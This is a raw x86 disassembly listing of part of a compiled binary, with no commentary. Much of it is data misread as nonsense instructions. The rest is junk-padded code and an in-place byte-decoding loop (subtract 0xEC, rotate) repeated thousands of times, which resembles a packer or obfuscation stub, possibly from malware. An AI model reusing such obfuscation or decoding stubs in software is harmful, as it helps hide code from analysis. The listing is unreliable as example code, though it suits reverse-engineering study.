  416488:	xlat   BYTE PTR ds:[ebx]
  416489:	sub    dh,bh
  41648b:	inc    esi
  41648c:	mov    esp,0xc52aa2f8
  416491:	out    dx,eax
  416492:	gs dec esi
  416494:	ret    0x3847
  416497:	push   esp
  416498:	sbb    BYTE PTR [ebx+edi*4+0x2c],ah
  41649c:	out    dx,al
  41649d:	jbe    0x41650b
  41649f:	out    0x96,al
  4164a1:	cmp    eax,0xe9c61e3
  4164a6:	push   eax
  4164a7:	xor    al,0x7d
  4164a9:	add    ebx,ebp
  4164ab:	xchg   ebp,eax
  4164ac:	adc    DWORD PTR [esi+0x698fbdb8],edx
  4164b2:	shl    BYTE PTR [eax+0x2c],0x1e
  4164b6:	push   ss
  4164b7:	pop    eax
  4164b8:	fidivr WORD PTR [esi-0x38]
  4164bb:	lds    ebp,FWORD PTR [edx]
  4164bd:	call   0xed0a:0x95c6b635
  4164c4:	and    eax,0x2af188eb
  4164c9:	call   FWORD PTR [eax-0x20]
  4164cc:	lock enter 0xbffe,0x17
  4164d1:	sub    ch,dl
  4164d3:	push   edx
  4164d4:	mov    ch,0xf1
  4164d6:	push   esi
  4164d7:	outs   dx,BYTE PTR ds:[esi]
  4164d8:	mov    bh,0x87
  4164da:	ins    DWORD PTR es:[edi],dx
  4164db:	(bad)  
  4164dc:	and    esp,DWORD PTR [edi-0x16]
  4164df:	xchg   ebx,eax
  4164e0:	daa    
  4164e1:	gs mov cl,0xdc
  4164e4:	cs mov eax,0x2e9298a9
  4164ea:	pop    ecx
  4164eb:	pop    edi
  4164ec:	cmp    BYTE PTR [ebx-0x108af177],bl
  4164f2:	adc    eax,0x8153daec
  4164f7:	das    
  4164f8:	xchg   esp,eax
  4164f9:	jmp    0x9b44:0x458f073d
  416500:	test   BYTE PTR [edx-0x25f0404c],al
  416506:	mov    edi,0x43c6f1c5
  41650b:	cmovg  edi,DWORD PTR [ecx-0x52]
  41650f:	pop    edi
  416510:	clc    
  416511:	aam    0xdb
  416513:	mov    ah,0xb0
  416515:	or     dh,dh
  416517:	hlt    
  416518:	ds popa 
  41651a:	and    cl,bh
  41651c:	xor    al,0xc6
  41651e:	inc    esi
  41651f:	push   0xe3131a5
  416524:	sbb    eax,0xf95bc001
  416529:	and    cl,dl
  41652b:	add    dh,al
  41652d:	aas    
  41652e:	lods   eax,DWORD PTR ds:[esi]
  41652f:	jno    0x416519
  416531:	fs clc 
  416533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416534:	cmp    esp,DWORD PTR [edx+ebx*2+0x8]
  416538:	pop    ebx
  416539:	inc    eax
  41653a:	test   al,0x9d
  41653c:	jp     0x4164cc
  41653e:	js     0x41653a
  416540:	fmul   DWORD PTR [edi]
  416542:	aam    0xf9
  416544:	fldcw  WORD PTR [esi]
  416546:	and    DWORD PTR [edi],eax
  416548:	shr    DWORD PTR [ecx+0x52],1
  41654b:	push   esi
  41654c:	shl    DWORD PTR [eax-0x45],0x2a
  416550:	push   es
  416551:	dec    esp
  416552:	mov    edi,0x2f13d69f
  416557:	jo     0x4165af
  416559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41655a:	mov    ds:0x33e99972,al
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x4225c8
  416605:	mov    edi,0x42250e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x4225c8
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp-0x269fbf90]
  416729:	mov    esp,0x1816fc77
  41672e:	fwait
  41672f:	adc    al,0x18
  416731:	sbb    cl,ah
  416733:	psraw  mm2,QWORD PTR ds:[ebx-0x2c]
  416738:	stos   BYTE PTR es:[edi],al
  416739:	add    BYTE PTR [ebx],0x44
  41673c:	idiv   cl
  41673e:	mov    bl,0x89
  416740:	or     BYTE PTR [ecx+0x721821a9],dl
  416746:	push   ebp
  416747:	shl    DWORD PTR [edi],0x37
  41674a:	(bad)  
  41674b:	in     eax,dx
  41674c:	cs dec ecx
  41674e:	push   ebx
  41674f:	sub    dl,bl
  416751:	pop    edx
  416752:	sub    edx,ecx
  416754:	sbb    WORD PTR [edx-0x45],sp
  416758:	xor    edx,DWORD PTR [edx]
  41675a:	mov    edi,0xc22e1253
  41675f:	add    ecx,DWORD PTR [ebx-0x68]
  416762:	out    dx,al
  416763:	sbb    ch,BYTE PTR [ecx+0x37]
  416766:	mov    dh,0x7e
  416768:	xor    ch,dl
  41676a:	aad    0x88
  41676c:	dec    esi
  41676d:	xchg   ebp,eax
  41676e:	adc    BYTE PTR [ebp-0x6ddafa2f],0xc5
  416775:	sar    BYTE PTR [edx+ebp*4+0x5b],cl
  416779:	scas   al,BYTE PTR es:[edi]
  41677a:	xchg   ebx,eax
  41677b:	rcl    BYTE PTR [eax],cl
  41677d:	dec    esi
  41677e:	jg     0x4167e1
  416780:	in     al,0xb7
  416782:	lea    ax,[ebx]
  416785:	int3   
  416786:	ds in  al,0xc5
  416789:	mov    ch,0xf
  41678b:	shl    BYTE PTR [ebx+0x60],cl
  41678e:	shl    al,cl
  416790:	and    al,0x13
  416792:	push   ebx
  416793:	test   ah,cl
  416795:	mov    bl,0x17
  416797:	inc    edi
  416798:	jmp    0x9709:0xbea27f10
  41679f:	loop   0x416810
  4167a1:	loope  0x41672b
  4167a3:	aas    
  4167a4:	ficom  WORD PTR [eax+0x7a0eabcf]
  4167aa:	xor    esi,DWORD PTR [eax+0x55]
  4167ad:	ret    
  4167ae:	pop    ecx
  4167af:	ror    BYTE PTR [eax+0x21],0x9b
  4167b3:	xor    ah,BYTE PTR [eax]
  4167b5:	xor    ebx,0xcf1baf82
  4167bb:	cmp    al,0xe8
  4167bd:	(bad)  
  4167be:	in     eax,dx
  4167bf:	je     0x416791
  4167c1:	sti    
  4167c2:	xchg   ebx,eax
  4167c3:	ret    
  4167c4:	mov    dh,0x90
  4167c6:	sahf   
  4167c7:	mov    esi,edi
  4167c9:	repz mov dh,0x4d
  4167cc:	fidivr DWORD PTR [esp+ecx*4+0x2b4ab1ba]
  4167d3:	and    DWORD PTR [ebx-0x33],ecx
  4167d6:	leave  
  4167d7:	jo     0x4167cb
  4167d9:	xchg   ebx,eax
  4167da:	mov    edx,0x585f5c6a
  4167df:	mov    BYTE PTR ds:0x942323fa,dl
  4167e5:	lea    ebp,[edi]
  4167e7:	push   ss
  4167e8:	outs   dx,DWORD PTR ds:[esi]
  4167e9:	(bad)  
  4167ea:	jle    0x41682e
  4167ec:	scas   al,BYTE PTR es:[edi]
  4167ed:	scas   eax,DWORD PTR es:[edi]
  4167ee:	push   cs
  4167ef:	addr16 pusha 
  4167f1:	shl    BYTE PTR [eax-0x72],cl
  4167f4:	mov    ds:0x8ddeb276,al
  4167f9:	outs   dx,BYTE PTR ds:[esi]
  4167fa:	(bad)
  4167fd:	push   ebp
  4167fe:	lods   al,BYTE PTR ds:[esi]
  4167ff:	inc    ebp
  416800:	jge    0x4167e8
  416802:	mov    edi,0xa15c9bca
  416807:	out    0xc5,eax
  416809:	add    ecx,ecx
  41680b:	sub    edx,eax
  41680d:	push   0xfffffff4
  41680f:	mov    WORD PTR [edx],gs
  416811:	ret    0xf1dc
  416814:	data16 jnp 0x416816
  416817:	and    al,0x5
  416819:	jno    0x4167bc
  41681b:	mov    edi,0xd1c229c7
  416820:	sub    BYTE PTR [ebx+0x4b],dl
  416823:	xor    eax,0x9ddb6219
  416828:	inc    ebx
  416829:	and    dh,ch
  41682b:	and    al,0xf2
  41682d:	cmc    
  41682e:	ins    BYTE PTR es:[edi],dx
  41682f:	cmp    eax,0x5ad10f36
  416834:	mov    esi,0xab111f1a
  416839:	cmp    al,0xb9
  41683b:	pop    ss
  41683c:	pop    ebx
  41683d:	imul   esp,eax,0xffffffa8
  416840:	add    BYTE PTR [ebx],ch
  416842:	cmp    al,BYTE PTR [ebp+0x4c5092d7]
  416848:	test   eax,0xeee8582d
  41684d:	cmp    edi,DWORD PTR [edi-0x5c5475e3]
  416853:	add    DWORD PTR [eax-0x1f],0xffffffe1
  416857:	xchg   edi,eax
  416858:	out    dx,al
  416859:	push   0x39
  41685b:	fimul  DWORD PTR [esi-0x73]
  41685e:	jmp    0xd140:0x777919fa
  416865:	pop    esi
  416866:	imul   edx,DWORD PTR [edi],0x7a881447
  41686c:	aaa    
  41686d:	pop    ebp
  41686e:	push   esp
  41686f:	aad    0x69
  416871:	imul   DWORD PTR [ecx+0x11]
  416874:	repnz mov dl,0x16
  416877:	sub    al,0x30
  416879:	pop    esi
  41687a:	xchg   BYTE PTR [ecx-0x5b],ah
  41687d:	or     al,BYTE PTR [edx]
  41687f:	dec    eax
  416880:	add    bh,bh
  416882:	cmp    al,0xb2
  416884:	push   edi
  416885:	adc    dh,BYTE PTR [eax-0x69]
  416888:	paddusb mm2,QWORD PTR [esi+0x36]
  41688c:	xlat   BYTE PTR ds:[ebx]
  41688d:	jle    0x416885
  41688f:	mov    eax,0x85623210
  416894:	repnz xchg ebp,eax
  416896:	push   ecx
  416897:	les    ebx,FWORD PTR [edx-0x78]
  41689a:	adc    esp,edi
  41689c:	mov    dh,0x8
  41689e:	(bad)  
  41689f:	test   eax,0xda274764
  4168a4:	sub    DWORD PTR [edx+0x4b],0xffffff95
  4168a8:	mov    edi,0x24bc5232
  4168ad:	xor    al,BYTE PTR [ecx+0x4df1e6c8]
  4168b3:	push   ecx
  4168b4:	mov    al,0xb8
  4168b6:	pop    esi
  4168b7:	push   0x23
  4168b9:	aad    0xdd
  4168bb:	xchg   ebx,eax
  4168bc:	sub    BYTE PTR [edi+0x48],bl
  4168bf:	ds cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4168c2:	adc    ebp,esp
  4168c4:	cdq    
  4168c5:	xor    BYTE PTR [eax+0x5b],bl
  4168c8:	mov    BYTE PTR [ecx-0x22],dl
  4168cb:	jnp    0x41685a
  4168cd:	das    
  4168ce:	push   ss
  4168cf:	lods   eax,DWORD PTR ds:[esi]
  4168d0:	es pop ebx
  4168d2:	popa   
  4168d3:	fistp  QWORD PTR [ecx-0x6caf2899]
  4168d9:	push   eax
  4168da:	stos   DWORD PTR es:[edi],eax
  4168db:	ret    
  4168dc:	cmp    esi,ecx
  4168de:	imul   edi,DWORD PTR [esi+0x16],0xae923c3f
  4168e5:	mov    bh,0x61
  4168e7:	or     eax,DWORD PTR [ecx-0x3d]
  4168ea:	and    eax,edi
  4168ec:	jge    0x416873
  4168ee:	ins    BYTE PTR es:[edi],dx
  4168ef:	scas   eax,DWORD PTR es:[edi]
  4168f0:	xor    eax,0x6bca45fd
  4168f5:	add    edi,ecx
  4168f7:	gs into 
  4168f9:	jb     0x41695a
  4168fb:	push   ss
  4168fc:	dec    ebx
  4168fd:	mov    ah,0x21
  416900:	adc    ebp,edx
  416902:	jecxz  0x416925
  416904:	adc    al,0xaa
  416906:	imul   esi,DWORD PTR ds:0x570a6576,0x34
  41690d:	fnsave [ecx+0x490a6ea7]
  416913:	sub    eax,DWORD PTR [ecx]
  416915:	pop    edx
  416916:	fistp  DWORD PTR ds:0xaa51a26d
  41691c:	cmp    DWORD PTR [edx-0x1d],ecx
  41691f:	pop    eax
  416920:	pop    ss
  416921:	test   dl,bh
  416923:	sbb    BYTE PTR [ecx+eiz*2-0x62],ah
  416927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416928:	push   0xfffffff3
  41692a:	daa    
  41692b:	mov    bh,0x88
  41692d:	call   0xaf9f:0x151dcf77
  416934:	mov    ebx,0x988dcb74
  416939:	ret    
  41693a:	pop    edi
  41693b:	in     eax,0xf1
  41693d:	jge    0x416976
  41693f:	mov    ecx,0xd09c8c30
  416944:	inc    ebp
  416945:	pop    esp
  416946:	mov    ds:0x262a851b,al
  41694b:	or     al,0xf
  41694d:	jno    0x416967
  41694f:	aaa    
  416950:	clc    
  416951:	fwait
  416952:	adc    eax,0x22726290
  416957:	dec    esp
  416958:	pop    edi
  416959:	call   0xfc83:0xf980c342
  416960:	and    DWORD PTR [edx-0x36],eax
  416963:	adc    eax,0xeaba2a01
  416968:	daa    
  416969:	dec    eax
  41696a:	fst    QWORD PTR ds:0x15db2f06
  416970:	sub    esi,eax
  416972:	out    dx,al
  416973:	mov    esp,0xfe458d12
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xbca5f774
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx+0x50181814],bl
  4169ac:	inc    ax
  4169ae:	loope  0x4169b3
  4169b0:	test   BYTE PTR [ebp+0x2b],0x35
  4169b4:	cmp    al,0x9e
  4169b6:	inc    edx
  4169b7:	out    0x5a,eax
  4169b9:	jmp    0x734e:0x2d9d292f
  4169c0:	mov    dh,0xf
  4169c2:	adc    BYTE PTR [esi+0x6d],dh
  4169c5:	scas   eax,DWORD PTR es:[edi]
  4169c6:	push   ebx
  4169c7:	sub    DWORD PTR [edx],0xffffff80
  4169ca:	out    dx,eax
  4169cb:	rcr    BYTE PTR [edi-0x626fbde],cl
  4169d1:	jno    0x416a34
  4169d3:	jmp    0x75bf9abb
  4169d8:	addr16 mov ah,bh
  4169db:	fld    st(2)
  4169dd:	and    eax,0x6bef7f92
  4169e2:	outs   dx,BYTE PTR ds:[esi]
  4169e3:	fnstenv [esp+esi*1-0x3ae2ef9]
  4169ea:	loop   0x416992
  4169ec:	jg     0x416a0e
  4169ee:	jp     0x4169b9
  4169f0:	movaps xmm5,xmm7
  4169f3:	outs   dx,BYTE PTR ds:[esi]
  4169f4:	cmp    BYTE PTR [eax+0x5063806b],bh
  4169fa:	adc    edx,eax
  4169fc:	cmp    eax,0xf41f20dc
  416a01:	(bad)  
  416a02:	sar    BYTE PTR [ebp+0x25c8e9d],0xe6
  416a09:	into   
  416a0a:	and    ebx,DWORD PTR [edx-0x75]
  416a0d:	pop    edx
  416a0e:	out    0xce,eax
  416a10:	jecxz  0x41699a
  416a12:	mov    ebx,ebp
  416a14:	mov    ?,WORD PTR [edi-0x7863e26d]
  416a1a:	push   ecx
  416a1b:	push   ebp
  416a1c:	adc    eax,0xbc2b32ce
  416a21:	pop    edi
  416a22:	test   eax,0x939417bc
  416a27:	xor    al,0xbc
  416a29:	mov    ebp,0x41d3e7a7
  416a2e:	nop
  416a2f:	in     eax,0x94
  416a31:	cwde   
  416a32:	hlt    
  416a33:	leave  
  416a34:	(bad)  
  416a35:	sbb    al,0xc3
  416a37:	mov    cl,0x3d
  416a39:	jecxz  0x4169cd
  416a3b:	int    0x97
  416a3d:	lea    eax,[ebx+0x27]
  416a40:	sub    BYTE PTR [edi],dl
  416a42:	push   edi
  416a43:	cmp    edi,DWORD PTR [ecx]
  416a45:	jg     0x4169f0
  416a47:	xor    ebp,DWORD PTR [ebp+0x1f5445fe]
  416a4d:	loope  0x416a03
  416a4f:	(bad)  
  416a50:	mov    eax,0x7536031f
  416a55:	out    0x68,eax
  416a57:	dec    edx
  416a58:	mov    ?,WORD PTR [edi+0x61]
  416a5b:	(bad)  
  416a5d:	dec    edi
  416a5e:	xor    cl,BYTE PTR [ebx+0x48a5bebe]
  416a64:	(bad)  [eax-0x25]
  416a67:	xor    eax,0x4d530918
  416a6c:	or     bl,cl
  416a6e:	mov    bl,al
  416a70:	mov    dh,0xef
  416a72:	sbb    eax,0x6fb8123f
  416a77:	loopne 0x4169fa
  416a79:	cmc    
  416a7a:	xchg   esi,eax
  416a7b:	cli    
  416a7c:	and    al,dl
  416a7e:	or     eax,0xe07c951e
  416a83:	pushf  
  416a84:	jle    0x416a20
  416a86:	pop    esp
  416a87:	ins    DWORD PTR es:[edi],dx
  416a88:	xlat   BYTE PTR ds:[ebx]
  416a89:	mov    esp,0x2ba1eaed
  416a8e:	out    dx,al
  416a8f:	popf   
  416a90:	js     0x416a85
  416a92:	inc    esp
  416a93:	mov    al,ds:0x9b1a36f2
  416a98:	lea    esi,[eax]
  416a9a:	push   ds
  416a9b:	mov    ebp,0x433db536
  416aa0:	in     al,0x17
  416aa2:	test   al,0x75
  416aa4:	xlat   BYTE PTR ds:[ebx]
  416aa5:	inc    esi
  416aa6:	jp     0x416aae
  416aa8:	add    dl,0x25
  416aab:	xor    ebx,DWORD PTR [ebp-0x295b9a7e]
  416ab1:	int3   
  416ab2:	stos   DWORD PTR es:[edi],eax
  416ab3:	xchg   edx,eax
  416ab4:	(bad)  [eax-0x4b1cb3df]
  416aba:	inc    ebx
  416abb:	sbb    eax,0x84cd5f16
  416ac0:	pop    esi
  416ac1:	jae    0x416b1f
  416ac3:	push   ss
  416ac4:	pop    edx
  416ac5:	cmp    BYTE PTR [ecx+0x4a1ee5c0],0xd6
  416acc:	in     al,0x32
  416ace:	pop    esp
  416acf:	fcmovne st,st(1)
  416ad1:	rcr    DWORD PTR [edx-0x4cb52327],1
  416ad7:	in     eax,dx
  416ad8:	mov    cl,0x21
  416ada:	sbb    al,dl
  416adc:	nop
  416add:	jmp    0x416b1c
  416adf:	sbb    DWORD PTR [ebx],esi
  416ae1:	jnp    0x416aa2
  416ae3:	fisttp WORD PTR [edx+ebx*4-0x3d]
  416ae7:	sub    DWORD PTR [esi-0x6f7010c6],edi
  416aed:	popa   
  416aee:	data16 sbb BYTE PTR [esi+0x5d],bh
  416af2:	mov    ah,0xd7
  416af4:	jl     0x416b57
  416af6:	add    eax,0x7539a860
  416afb:	stc    
  416afc:	stos   BYTE PTR es:[edi],al
  416afd:	push   ecx
  416afe:	and    BYTE PTR [ecx+ebx*1],0x9f
  416b02:	sub    ebx,ebx
  416b04:	mov    ds:0x8b098a5,eax
  416b09:	fmul   DWORD PTR [ebx]
  416b0b:	inc    edx
  416b0c:	or     cl,BYTE PTR [eax]
  416b0e:	mov    es,eax
  416b10:	mov    BYTE PTR [eax+edi*1-0x7c],cl
  416b14:	jns    0x416b72
  416b16:	cmp    BYTE PTR [ebp+0x77eeb83e],dh
  416b1c:	fistp  QWORD PTR [ecx-0x61]
  416b1f:	mov    al,0x62
  416b21:	sbb    BYTE PTR [eax+ebx*1+0x9],dl
  416b25:	out    dx,eax
  416b26:	pop    edi
  416b27:	sbb    cl,bh
  416b29:	fisttp QWORD PTR [ebp-0x68]
  416b2c:	sub    ebx,esi
  416b2e:	mov    ah,0x9b
  416b30:	sbb    bh,BYTE PTR [esi+0x3d]
  416b33:	adc    dh,ch
  416b35:	push   cs
  416b36:	cmp    BYTE PTR ds:0x449dd3d3,dh
  416b3c:	adc    eax,0x574c383f
  416b41:	or     eax,0x754ccb75
  416b46:	sub    DWORD PTR [ecx+0x23],0xa6ba7df1
  416b4d:	add    al,BYTE PTR [ecx-0x1e8fb360]
  416b53:	mov    al,0x49
  416b55:	xor    eax,0x4f1b140f
  416b5a:	lds    esp,FWORD PTR [esp+esi*2+0x51]
  416b5e:	rcl    BYTE PTR [ebx],cl
  416b60:	xchg   ebp,eax
  416b61:	mov    WORD PTR [ebp-0x18],ds
  416b64:	(bad)  
  416b65:	sbb    BYTE PTR [edx],cl
  416b67:	popf   
  416b68:	call   0xea5b5fa7
  416b6d:	mov    edi,esi
  416b6f:	jmp    0xe63dae37
  416b74:	mov    dh,0x8
  416b76:	int3   
  416b77:	fst    QWORD PTR [ebx+0x6b]
  416b7a:	shl    BYTE PTR [edx],cl
  416b7c:	pop    esi
  416b7d:	xor    dl,dl
  416b7f:	fild   WORD PTR [edi-0x22]
  416b82:	add    dh,BYTE PTR [ebp-0x130cd950]
  416b88:	push   edi
  416b89:	mov    al,0x96
  416b8b:	out    dx,eax
  416b8c:	jns    0x416b83
  416b8e:	jmp    FWORD PTR [esp+ecx*1]
  416b91:	xor    eax,0x4aa5ab15
  416b96:	outs   dx,BYTE PTR ds:[esi]
  416b97:	out    dx,eax
  416b98:	addr16 loope 0x416bb8
  416b9b:	cmp    DWORD PTR [esi-0x1b],0x5eabe703
  416ba2:	sbb    dh,al
  416ba4:	jo     0x416bd6
  416ba6:	inc    esp
  416ba7:	or     BYTE PTR ds:0xd21b7f05,dl
  416bad:	mov    eax,ds:0xc99bddc3
  416bb2:	imul   edx,DWORD PTR [edx-0x5e],0x7e4b861e
  416bb9:	fdivr  DWORD PTR [edi+esi*1]
  416bbc:	inc    edi
  416bbd:	mov    ds:0xe9eb3589,al
  416bc2:	xor    DWORD PTR ds:0xbf1bd30e,ebx
  416bc8:	lods   al,BYTE PTR ds:[esi]
  416bc9:	inc    eax
  416bcb:	mov    edi,0xc86895ef
  416bd0:	sub    eax,0x8d146a2a
  416bd5:	and    esi,ebp
  416bd7:	pop    ebp
  416bd8:	cwde   
  416bd9:	push   0xaa59c9c6
  416bde:	sub    al,BYTE PTR [ebp-0x66]
  416be1:	in     eax,dx
  416be2:	in     eax,0x3f
  416be4:	cs jmp 0xa0516ec
  416bea:	dec    ebx
  416beb:	inc    ecx
  416bec:	adc    eax,0xbd23340
  416bf1:	ret    0xc703
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42828f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x4283bb,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42826b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282e3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428343,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x42822b
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42826f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
